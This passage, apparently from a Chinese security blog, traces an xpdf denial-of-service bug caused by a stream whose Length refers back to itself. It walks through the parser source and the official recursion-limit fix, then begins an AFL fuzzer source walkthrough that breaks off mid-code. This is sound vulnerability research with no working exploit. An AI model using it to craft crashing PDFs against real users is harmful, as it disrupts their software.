Objects类型有不同的处理.如果是普通类型,则直接复制当前对象到obj.如果是间接对象,则在xref表中查找并再次fetch当前对象的实例.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object *<span class="title function_">Object::fetch</span><span class="params">(XRef *xref, Object *obj)</span> {</span><br><span class="line">  <span class="keyword">return</span> (type == objRef &amp;&amp; xref) ?</span><br><span class="line">         xref-&gt;fetch(ref.num, ref.gen, obj) : copy(obj);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>本用例中,contents是一个间接对象<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403091457231.png"></p><p>XRef::fetch的逻辑如下:</p><ul><li>根据num在XREF表中找到当前间接对象对应实例的条目e.<ul><li>如果是未压缩的条目<ul><li>启动一个新的parser从pdf文件中该实例起始偏移开始parse.</li><li>先读入obj1,obj2,obj3(分别对应pdf对象语法中的num,gen,obj/R)</li><li>再调用parser-&gt;getObj对该实例主体部分进行parse来构造obj.</li></ul></li></ul></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Object *<span class="title function_">XRef::fetch</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> gen, Object *obj)</span> {</span><br><span class="line">  XRefEntry *e;</span><br><span class="line">  Parser *parser;</span><br><span class="line">  Object obj1, obj2, obj3;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// check for bogus ref - this can happen in corrupted PDF files</span></span><br><span class="line">  <span class="keyword">if</span> (num &lt; <span class="number">0</span> || num &gt;= size) {</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  e = &amp;entries[num];</span><br><span class="line">  <span class="keyword">switch</span> (e-&gt;type) {</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> xrefEntryUncompressed:</span><br><span class="line">    <span class="keyword">if</span> (e-&gt;gen != gen) {</span><br><span class="line">      <span class="keyword">goto</span> err;</span><br><span class="line">    }</span><br><span class="line">    obj1.initNull();</span><br><span class="line">    parser = new Parser(this,</span><br><span class="line">       new Lexer(this,</span><br><span class="line"> str-&gt;makeSubStream(start + e-&gt;offset, gFalse, <span class="number">0</span>, &amp;obj1)),</span><br><span class="line">       gTrue);</span><br><span class="line">    parser-&gt;getObj(&amp;obj1);</span><br><span class="line">    parser-&gt;getObj(&amp;obj2);</span><br><span class="line">    parser-&gt;getObj(&amp;obj3);</span><br><span class="line">    <span class="keyword">if</span> (!obj1.isInt() || obj1.getInt() != num ||</span><br><span class="line">!obj2.isInt() || obj2.getInt() != gen ||</span><br><span class="line">!obj3.isCmd(<span class="string">"obj"</span>)) {</span><br><span class="line">      obj1.<span class="built_in">free</span>();</span><br><span class="line">      obj2.<span class="built_in">free</span>();</span><br><span class="line">      obj3.<span class="built_in">free</span>();</span><br><span class="line">      delete parser;</span><br><span class="line">      <span class="keyword">goto</span> err;</span><br><span class="line">    }</span><br><span class="line">    parser-&gt;getObj(obj, encrypted ? fileKey : (Guchar *)<span class="literal">NULL</span>,</span><br><span class="line">   encAlgorithm, keyLength, num, gen);</span><br><span class="line">    obj1.<span class="built_in">free</span>();</span><br><span class="line">    obj2.<span class="built_in">free</span>();</span><br><span class="line">    obj3.<span class="built_in">free</span>();</span><br><span class="line">    delete parser;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></tbody></table></figure><p>只关注该样例中触发的路径.本样例中,contents是编号为7的stream对象的间接对象.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403091510925.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403091508295.png"></p><p>下方是省略后的Parser::getObj.在第30行中构造以name对象”Lenth”为key的字典条目时,再次调用了getObj函数来获得该条目的value.</p><p>第二次层调用会直接来到第51行,识别出该value是一个间接对象.这是符合pdf标准的.</p><blockquote><p>Any object in a PDF file may be labeled as an indirect object. </p></blockquote><p>回到第一层调用,第38行,此时stream对象的dictionary部分已经parse完毕,调用makeStream进行主体部分的解析.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">Object *<span class="title function_">Parser::getObj</span><span class="params">(Object *obj, Guchar *fileKey,</span></span><br><span class="line"><span class="params">       CryptAlgorithm encAlgorithm, <span class="type">int</span> keyLength,</span></span><br><span class="line"><span class="params">       <span class="type">int</span> objNum, <span class="type">int</span> objGen)</span> {</span><br><span class="line">  <span class="type">char</span> *key;</span><br><span class="line">  Stream *str;</span><br><span class="line">  Object obj2;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  DecryptStream *decrypt;</span><br><span class="line">  GString *s, *s2;</span><br><span class="line">  <span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">  <span class="comment">// dictionary or stream</span></span><br><span class="line">    <span class="keyword">if</span> (buf1.isCmd(<span class="string">"&lt;&lt;"</span>)) {</span><br><span class="line">    shift();</span><br><span class="line">    obj-&gt;initDict(xref);</span><br><span class="line">    <span class="keyword">while</span> (!buf1.isCmd(<span class="string">"&gt;&gt;"</span>) &amp;&amp; !buf1.isEOF()) {</span><br><span class="line">      <span class="keyword">if</span> (!buf1.isName()) {</span><br><span class="line">error(getPos(), <span class="string">"Dictionary key must be a name object"</span>);</span><br><span class="line">shift();</span><br><span class="line">      } <span class="keyword">else</span> {</span><br><span class="line">key = copyString(buf1.getName());</span><br><span class="line">shift();</span><br><span class="line"><span class="keyword">if</span> (buf1.isEOF() || buf1.isError()) {</span><br><span class="line">  gfree(key);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">obj-&gt;dictAdd(key, getObj(&amp;obj2, fileKey, encAlgorithm, keyLength,</span><br><span class="line"> objNum, objGen));</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (buf1.isEOF())</span><br><span class="line">      error(getPos(), <span class="string">"End of file inside dictionary"</span>);</span><br><span class="line">    <span class="comment">// stream objects are not allowed inside content streams or</span></span><br><span class="line">    <span class="comment">// object streams</span></span><br><span class="line">    <span class="keyword">if</span> (allowStreams &amp;&amp; buf2.isCmd(<span class="string">"stream"</span>)) {</span><br><span class="line">      <span class="keyword">if</span> ((str = makeStream(obj, fileKey, encAlgorithm, keyLength,</span><br><span class="line">    objNum, objGen))) {</span><br><span class="line">obj-&gt;initStream(str);</span><br><span class="line">      } <span class="keyword">else</span> {</span><br><span class="line">obj-&gt;<span class="built_in">free</span>();</span><br><span class="line">obj-&gt;initError();</span><br><span class="line">      }</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      shift();</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// indirect reference or integer</span></span><br><span class="line">  } <span class="keyword">else</span> <span class="keyword">if</span> (buf1.isInt()) {</span><br><span class="line">    num = buf1.getInt();</span><br><span class="line">    shift();</span><br><span class="line">    <span class="keyword">if</span> (buf1.isInt() &amp;&amp; buf2.isCmd(<span class="string">"R"</span>)) {</span><br><span class="line">      obj-&gt;initRef(num, buf1.getInt());</span><br><span class="line">      shift();</span><br><span class="line">      shift();</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      obj-&gt;initInt(num);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>解析主体部分需要先获取主体部分的长度,即之前字典中保存的Lenth对应的value.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Stream *<span class="title function_">Parser::makeStream</span><span class="params">(Object *dict, Guchar *fileKey,</span></span><br><span class="line"><span class="params">   CryptAlgorithm encAlgorithm, <span class="type">int</span> keyLength,</span></span><br><span class="line"><span class="params">   <span class="type">int</span> objNum, <span class="type">int</span> objGen)</span> {</span><br><span class="line">  Object obj;</span><br><span class="line">  BaseStream *baseStr;</span><br><span class="line">  Stream *str;</span><br><span class="line">  Guint pos, endPos, length;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// get stream start position</span></span><br><span class="line">  lexer-&gt;skipToNextLine();</span><br><span class="line">  pos = lexer-&gt;getPos();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// get length</span></span><br><span class="line">  dict-&gt;dictLookup(<span class="string">"Length"</span>, &amp;obj);</span><br><span class="line">  <span class="keyword">if</span> (obj.isInt()) {</span><br><span class="line">    length = (Guint)obj.getInt();</span><br><span class="line">    obj.<span class="built_in">free</span>();</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    error(getPos(), <span class="string">"Bad 'Length' attribute in stream"</span>);</span><br><span class="line">    obj.<span class="built_in">free</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>如之前所述,由于允许value是一个间接对象,所以这里需要调用Object::fetch来尝试获得该间接对象的实例.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Object *<span class="title function_">Dict::lookup</span><span class="params">(<span class="type">char</span> *key, Object *obj)</span> {</span><br><span class="line">  DictEntry *e;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (e = find(key)) ? e-&gt;val.fetch(xref, obj) : obj-&gt;initNull();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>结合我们的输入,该Length对应的间接对象即是该stream对象本身,于是我们又开始了新一轮对该stream对象的解析,至此形成闭环,造成无限递归.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403091532723.png"></p><h3 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h3><p>跟完漏洞的触发链后,来分析一下造成该漏洞的原因.<br>在源码分析的过程中,我潜意识中一直错误地认为是”间接对象的实例也是一个间接对象且不断循环”造成的问题,并认为既然标准这样规定,这个问题似乎无法避免.但其实细想一下,根本无法构造间接对象的实例也是一个间接对象的情况,因为间接对象不存在对象编号,也就无法被引用.<br>且在解引用(XRef::fetch)的过程中,也有对间接对象的实例必须是普通对象的check.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (!obj1.isInt() || obj1.getInt() != num ||</span><br><span class="line">!obj2.isInt() || obj2.getInt() != gen ||</span><br><span class="line">!obj3.isCmd(<span class="string">"obj"</span>)) { <span class="comment">// ! ! !</span></span><br><span class="line">     obj1.<span class="built_in">free</span>();</span><br><span class="line">     obj2.<span class="built_in">free</span>();</span><br><span class="line">     obj3.<span class="built_in">free</span>();</span><br><span class="line">     delete parser;</span><br><span class="line">     <span class="keyword">goto</span> err;</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure><p>所以漏洞实际的成因是,在解析A(stream)对象的过程中,需要解析间接对象B(value for “Lenth”),而在解析间接对象B的过程中,需要解析对象A(stream).倒是一个非常常见的无限循环的Pattern了(比如循环继承,比如文法中的左递归).</p><h3 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h3><p>看到的一种修补方案是:</p><blockquote><p>在研究清楚为什么 crash 之后，我们的修复方案已经明了：若 Length 所对应的 val 不是 objInt，则不能执行第 6 条分析里的 obj-&gt;dictLookup(“Length”, &amp;newobj)</p></blockquote><p>这其实并不符合pdf关于间接对象的标准.</p><p>官方的修补是这样的(源码来自xpdf-4.05),加入了recursion的限制,如果递归层数达到500就不会再进一步对stream解析</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// If object is a Ref, fetch and return the referenced object.</span></span><br><span class="line">  <span class="comment">// Otherwise, return a copy of the object.</span></span><br><span class="line">  Object *<span class="title function_">fetch</span><span class="params">(XRef *xref, Object *obj, <span class="type">int</span> recursion = <span class="number">0</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Object *<span class="title function_">Parser::getObj</span><span class="params">(Object *obj, GBool simpleOnly,</span></span><br><span class="line"><span class="params">       Guchar *fileKey,</span></span><br><span class="line"><span class="params">       CryptAlgorithm encAlgorithm, <span class="type">int</span> keyLength,</span></span><br><span class="line"><span class="params">       <span class="type">int</span> objNum, <span class="type">int</span> objGen, <span class="type">int</span> recursion)</span> {</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (!simpleOnly &amp;&amp; recursion &lt; recursionLimit &amp;&amp; buf1.isCmd(<span class="string">"&lt;&lt;"</span>))</span><br><span class="line">......</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>而是当作simple object,直接从buf1的token中构造对象.此时buf1为待解析的objCmd:”&gt;&gt;”.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// simple object</span></span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    buf1.copy(obj);</span><br><span class="line">    shift();</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Object *<span class="title function_">Object::copy</span><span class="params">(Object *obj)</span> {</span><br><span class="line">  *obj = *this;</span><br><span class="line">  <span class="keyword">switch</span> (type) {</span><br><span class="line">  <span class="keyword">case</span> objString:</span><br><span class="line">    obj-&gt;<span class="built_in">string</span> = <span class="built_in">string</span>-&gt;copy();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> objName:</span><br><span class="line">    obj-&gt;name = copyString(name);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> objArray:</span><br><span class="line">    <span class="built_in">array</span>-&gt;incRef();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> objDict:</span><br><span class="line">    dict-&gt;incRef();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> objStream:</span><br><span class="line">    obj-&gt;stream = stream-&gt;copy();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> objCmd:</span><br><span class="line">    obj-&gt;cmd = copyString(cmd);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>然后会由于对Lenth的解析没有解析出一个objInt而抛出错误Missing or invalid ‘Length’ attribute in stream.然后就是解递归的过程.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">  Object obj;</span><br><span class="line">  dict-&gt;dictLookup(<span class="string">"Length"</span>, &amp;obj, recursion);</span><br><span class="line">  <span class="keyword">if</span> (obj.isInt()) {</span><br><span class="line">    length = (GFileOffset)(Guint)obj.getInt();</span><br><span class="line">    haveLength = gTrue;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    error(errSyntaxError, getPos(),</span><br><span class="line">   <span class="string">"Missing or invalid 'Length' attribute in stream"</span>);</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403091905060.png"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> 应用层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL 源码分析</title>
      <link href="/2024/AFL%20Analysis/"/>
      <url>/2024/AFL%20Analysis/</url>
      
        <content type="html"><![CDATA[<blockquote><p>只要吃透了AFL的源码，就能掌握绝⼤部分fuzzer的要领</p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>源码分析之前需先对AFL有个基本的认识,可以看看这篇文章: <a href="https://xidoo.top/2022/01/afl-white-book">https://xidoo.top/2022/01/afl-white-book</a><br>本文按照时序对afl-fuzz.c进行分析.相应函数在第一次调用点进行分析.<br>参考文章:<a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p><span id="more"></span><h1 id="调试准备"><a href="#调试准备" class="headerlink" title="调试准备"></a>调试准备</h1><p>使用的是Sakura师傅提供的Clion调试环境.<br>程序调试到fork时会挂掉,提前设置set follow-fork-mode parent来继续跟踪Fuzzer(虽然但是,这个选项不应该是默认行为么…).<br>可以通过这样的方式加载特定项目的gdb脚本</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set auto-load local-gdbinit on</span><br><span class="line">add-auto-load-safe-path [full path to the project root]/.gdbinit</span><br></pre></td></tr></tbody></table></figure><h1 id="afl-fuzz-c"><a href="#afl-fuzz-c" class="headerlink" title="afl-fuzz.c"></a>afl-fuzz.c</h1><h2 id="初始配置"><a href="#初始配置" class="headerlink" title="初始配置"></a>初始配置</h2><h3 id="随机数种子"><a href="#随机数种子" class="headerlink" title="随机数种子"></a>随机数种子</h3><p>首先调用gettimeofday获取当前时间,根据当前时间异或上当前进程pid后传入srandom作为随机数种子.</p><h3 id="处理参数"><a href="#处理参数" class="headerlink" title="处理参数"></a>处理参数</h3><p>接下来处理传给afl-fuzz的参数,设定相关flag及配置变量,检查参数合法性.</p><h3 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h3><p>设置信号处理函数.</p><ul><li>SIGHUP,SIGINT,SIGTERM: 设置stop_soon=1,向child和fork_server发送SIGKILL.</li><li>SIGALRM: 如设置child_time_out = 1,向child发送SIGKILL,如果child_pid == -1,转而向fork_server发送SIGKILL.</li><li>SIGWINCH: 设置clear_screen=1.</li><li>SIGUSR1: 设置skip_requested=1(使用SIGUSR1作为skip entry的信号)</li><li>SIGTSTP,SIGPIPE(stop signal from tty/write on a pipe with no one to read it): 使用SIG_IGN忽视.</li></ul><h4 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h4><p>读取环境变量中的ASAN_OPTIONS及MSAN_OPTIONS选项,进行检查.</p><h3 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h3><p>修复使用-S,-M选项时(distributed mode)的out_dir和sync_dir.<br>sync_dir = out_dir<br>outdir = outdir/sync_id</p><h3 id="读取环境变量配置"><a href="#读取环境变量配置" class="headerlink" title="读取环境变量配置"></a>读取环境变量配置</h3><p>读取一些环境变量的配置.其中AFL_PRELOAD及AFL_LD_PRELOAD可以指定共享库和加载器的路径</p><h3 id="save-cmdline"><a href="#save-cmdline" class="headerlink" title="save_cmdline"></a>save_cmdline</h3><p>将command line拷贝一份到orig_cmdline,参数间由空格分隔.</p><h3 id="fix-up-banner"><a href="#fix-up-banner" class="headerlink" title="fix_up_banner"></a>fix_up_banner</h3><p>Trim and possibly create a banner for the run.</p><h3 id="check-if-tty"><a href="#check-if-tty" class="headerlink" title="check_if_tty"></a>check_if_tty</h3><p>检查是否需要UI及是否正在使用TTY</p><h3 id="get-core-count"><a href="#get-core-count" class="headerlink" title="get_core_count"></a>get_core_count</h3><p>读取_SC_NPROCESSORS_ONLN配置获取CPU核数.</p><h3 id="bind-to-free-cpu"><a href="#bind-to-free-cpu" class="headerlink" title="bind_to_free_cpu"></a>bind_to_free_cpu</h3><p>调用sched_setaffinity将当前进程绑定到(指定的)空闲CPU</p><h3 id="check-crash-handling"><a href="#check-crash-handling" class="headerlink" title="check_crash_handling"></a>check_crash_handling</h3><p>检查/proc/sys/kernel/core_pattern,确保崩溃产生的核心转储不会发送给某个外部工具,避免fuzzer因延迟过长而将崩溃认为是超时.</p><h3 id="check-cpu-governor"><a href="#check-cpu-governor" class="headerlink" title="check_cpu_governor"></a>check_cpu_governor</h3><p>检测CPU的调度策略</p><h3 id="setup-post"><a href="#setup-post" class="headerlink" title="setup_post"></a>setup_post</h3><p>dlopen打开环境变量AFL_POST_LIBRARY指定的库,设置post_handler为库中的alf_postprocess函数</p><h3 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm"></a>setup_shm</h3><p>配置共享内存和virgin_bits(Regions yet untouched by fuzzing)</p><h3 id="init-count-class16"><a href="#init-count-class16" class="headerlink" title="init_count_class16"></a>init_count_class16</h3><p>初始化count_class_lookup16数组,与count_class_lookup8作用相同.将元组(边)实际命中次数映射到某个桶中.<br>出于效率原因一次读取16bit.</p><blockquote><p>AFL 在检测新元组出现的同时，也粗略地考虑了元组命中次数，它们被分为了如下几个桶 bucket ：<br>    1, 2, 3, 4-7, 8-15, 16-31, 32-127, 128+<br>元组数在每个桶内的变化是可以忽略的；从一个桶到另一个桶的改变将会被认为是程序控制流中的一次有趣的改变，也会指导下一阶段的进化过程 evolutionary process .</p></blockquote><p>不是很好理解,与classify_count结合起来理解.写法挺有意思的,后面has_new_bits还会提到</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Destructively classify execution counts in a trace. This is used as a</span></span><br><span class="line"><span class="comment">   preprocessing step for any newly acquired traces. Called on every exec,</span></span><br><span class="line"><span class="comment">   must be fast. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8 count_class_lookup8[<span class="number">256</span>] = {</span><br><span class="line"></span><br><span class="line">    [<span class="number">0</span>] = <span class="number">0</span>,</span><br><span class="line">    [<span class="number">1</span>] = <span class="number">1</span>,</span><br><span class="line">    [<span class="number">2</span>] = <span class="number">2</span>,</span><br><span class="line">    [<span class="number">3</span>] = <span class="number">4</span>,</span><br><span class="line">    [<span class="number">4</span> ... <span class="number">7</span>] = <span class="number">8</span>,</span><br><span class="line">    [<span class="number">8</span> ... <span class="number">15</span>] = <span class="number">16</span>,</span><br><span class="line">    [<span class="number">16</span> ... <span class="number">31</span>] = <span class="number">32</span>,</span><br><span class="line">    [<span class="number">32</span> ... <span class="number">127</span>] = <span class="number">64</span>,</span><br><span class="line">    [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u16 count_class_lookup16[<span class="number">65536</span>];</span><br><span class="line"></span><br><span class="line">EXP_ST <span class="type">void</span> <span class="title function_">init_count_class16</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">  u32 b1, b2;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (b1 = <span class="number">0</span>; b1 &lt; <span class="number">256</span>; b1++)</span><br><span class="line">    <span class="keyword">for</span> (b2 = <span class="number">0</span>; b2 &lt; <span class="number">256</span>; b2++)</span><br><span class="line">      count_class_lookup16[(b1 &lt;&lt; <span class="number">8</span>) + b2] =</span><br><span class="line">          (count_class_lookup8[b1] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">          count_class_lookup8[b2];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> WORD_SIZE_64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title 